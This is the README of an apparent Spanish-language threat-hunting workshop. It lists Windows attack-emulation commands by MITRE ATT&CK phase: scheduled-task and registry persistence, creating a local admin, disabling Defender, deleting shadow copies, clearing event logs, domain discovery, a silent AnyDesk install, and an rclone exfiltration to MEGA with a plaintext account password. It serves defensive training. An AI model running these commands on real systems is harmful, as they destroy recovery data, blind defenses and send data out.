# Workshop-CERT-2024
Que tal Hunter,

Bienvenidos a este Workshop creado para Threat Hunters.

Este repositorio contiene un conjunto de Scripts para Emular ataques avanzados operados por Humano. Además pueden encontrar todos los comandos en un solo archivo y un archivo más con los filtros para hacer hunting en Elastic Cloud.

Espero lo disfrute.

Marvin Amador
Threat Hunter

---

<center>

# **HACKING PLAYBOOK**
> Guia Para Hackers:

|Elaborado por|
|-|
|Marvin Amador|
|Threat Hunter|
 </center>

## Manual de Ataques:

- [x] Generar Rastros de un Ataque
	- [ ] EXECUTION
	- [ ] PERSISTENCE
	- [ ] PRIVILEGE ESCALATION
	- [ ] DEFENSE EVASION
	- [ ] DISCOVERY
	- [ ] COMMAND AND CONTROL
- [x] Capture The Flags
	- [ ] EXFILTRATION

## Objetivo

|Ejecutar comandos comunmente utilizados por atacantes en cada fase de la Matriz de Mitre Att&ck, esto le  permitirá al Hunter saber que es lo que debe Cazar. Por último, hay un CTF diseñado para que el Hunter comprenda como se vería un evento de Exfiltración de Datos. 
|-|

==**NOTA IMPORTANTE**:==
- La ejecución de los comandos se realiza desde el CMD. Únicaente algunos se realizan desde PowerShell y en cada sección está descrito. 
- Se recomienda que el Hunter ejecute todos los comandos de una sola vez y luego inicie la cacería en Elastic Cloud. Duración 10 min 
- Dejar para el final el CTF. 

# **LABORATORIO**

1. **EXECUTION**
- Técnica: **Scheduled Task (T1053)**
Este comando crea una tarea programada llamada "**Workshop Task 2024**" que ejecutará la calculadora de Windows diariamente a las 10:20 AM.
```
schtasks /create /tn "Workshop Task 2024" /tr "C:\Windows\System32\calc.exe" /sc daily /st 10:20
```

2. **PERSISTENCE**
- Técnica: **Registry Run Keys / Start Folder (T1060)**
Este comando agrega una entrada al Registro que ejecutará la calculadora de Windows al inicio del usuario actual.
```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Workshop registry 2024" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```

3. **PRIVILEGE ESCALATION**
Enumerar los miembros del grupo de administradores local es relevante para la fase de elevación de privilegios, ya que proporciona información sobre cuentas con privilegios elevados.
```
net user certuser Sisap2024 /add
net localgroup administrators certuser /add
```

4. **DEFENSE EVASION**
- Técnica: **Disable or Modify Tools (T1562.001)**
==Desactivacion de AV==
```
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /format:list
```
==**Ejecutar desde PowerShell:**==
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
```
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
```

- Técnica: **Data Destruction (T1485)**
```
WMIC.exe shadowcopy delete /nointeractive
vssadmin.exe delete shadows /all /quiet
```

- Técnica: **Clear Windows Event Logs (T1070.001)**
```
wevtutil cl system
wevtutil clear-log application
wevtutil clear-log security
wevtutil clear-log setup

```

5. **DISCOVERY**
Estos comandos proporcionan información sobre usuarios, grupos, unidades compartidas y controladores de dominio, y podrían ser parte de la fase de descubrimiento, donde un atacante busca comprender la topología del sistema y sus privilegios.
- Técnica: **System Information Discovery (T1082)**
Estos comandos se utilizan para obtener información sobre la identidad del usuario y los grupos a los que pertenece. Utiliza WMIC para obtener información sobre las unidades lógicas en el sistema
```
whoami
whoami /groups
systeminfo
wmic logicaldisk get name
```

- Técnica: **System Network Configuration Discovery (T1016)**
Estos comandos se utilizan para obtener información sobre la configuración de red en un sistema Windows.
```
ipconfig
arp -a
```
- Técnica: **Permission Groups Discovery (T1069)**
Enumera los miembros del grupo local de administradores, proporcionando información sobre cuentas con privilegios elevados.
```
net localgroup administrators
```

Enumera los miembros de grupos importantes como "Domain Admins" y "Enterprise Admins".
```
net group /domain "Domain Admins"
net group "Enterprise Admins" /domain
```
- Técnica: **Active Directory Reconnaissance (T1018)**
Estos comandos se utilizan para obtener información sobre el entorno de Active Directory, incluyendo controladores de dominio y confianzas de dominio.
```
nltest /dclist:windomain.local
nltest /domain_trusts
```
- Técnica: **Network Share Discovery (T1135)**
Muestra información sobre las comparticiones de red en el sistema.
```
net share
```

- Técnica: **System Owner/User Discovery (T1033)**
Muestra una lista de unidades disponibles en el sistema.
```
fsutil fsinfo drives
```

5. **COMMAND AND CONTROL**
- Técnica: **Remote Access Software (T1219)**
Algunos atacantes utilizan herramientas de supervisión y administración remotas (RMM) como Anydesk, Atera, Splashtop, TeamViewer, ScreenConnect, LogMeIn, entre otras, para controlar remotamente a su víctima.
==**Ejecutar desde PowerShell:**==
```
# Descargar el instalador de AnyDesk
Invoke-WebRequest -Uri 'https://download.anydesk.com/AnyDesk.exe' -OutFile 'C:\Windows\Temp\AnyDesk.exe'

# Instalar AnyDesk silenciosamente
Start-Process -Wait -FilePath 'C:\Windows\Temp\AnyDesk.exe' -ArgumentList '/S'
```

# **CAPTURE DE FLAG**

---
El Desafio Final del Workshop es aprender como los Adversarios roban información utilizando la herramienta **rclone**. Para esto, el hunter deberá realizar 2 actividades:
- Utilizar Rclone para exfiltrar un archivo de texto con el nombre del hunter
- Demostrar el evento en la consola de Elastic Cloud
---
## 6. **EXFILTRATION** 

- Técnica: **Remote Access Software (T1219)**
Algunos atacantes utilizan herramientas de supervisión y administración remotas (RMM) como Anydesk, Atera, Splashtop, TeamViewer, ScreenConnect, LogMeIn, entre otras, para controlar remotamente a su víctima.

==**Ejecutar desde PowerShell:**==
```
# Descargar el instalador de AnyDesk y configuralo
Invoke-WebRequest https://downloads.rclone.org/v1.56.0/rclone-v1.56.0-windows-amd64.zip -OutFile 'C:\Windows\Temp\rclone.zip'
Expand-Archive -Path 'C:\Windows\Temp\rclone.zip' -DestinationPath 'C:\Windows\Temp\'
cd C:\Windows\Temp\rclone-v1.56.0-windows-amd64
.\rclone.exe config

# configurando rclon
n
name: cert
storage: mega
user: huntercert01@gmail.com
password: NaQ@YGls9%cUHMGu
n
y
q
# Creemos un archivo para exfiltrar
echo CTF logrado > marvinamador.txt

# Comando para exfiltrar el archivo creado
.\rclone.exe copy "C:\Windows\Temp\rclone-v1.56.0-windows-amd64\marvinamador.txt" cert: -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 3 --bwlimit 5M

```

<center>
HAPPY HUNTING!
</center>


